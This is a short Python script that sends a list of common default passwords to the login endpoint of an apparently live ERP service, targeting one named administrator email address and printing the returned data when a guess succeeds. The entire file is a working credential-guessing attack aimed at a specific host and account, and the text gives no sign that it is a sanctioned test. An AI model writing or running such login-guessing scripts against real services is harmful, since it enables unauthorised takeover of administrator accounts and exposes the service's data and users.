import requests

BASE = "https://edusphere-erp.onrender.com/api/v1"

passwords = ["edusphere", "Admin@2024", "admin", "admin123", "password"]
for pw in passwords:
    r = requests.post(f"{BASE}/auth/login", json={"email": "edusphereadmin@gmail.com", "password": pw}, timeout=15)
    if r.status_code == 200:
        print(f"SUCCESS: edusphereadmin@gmail.com / {pw}")
        print(r.json())
        break
    else:
        print(f"FAIL [{r.status_code}]: edusphereadmin@gmail.com / {pw}")
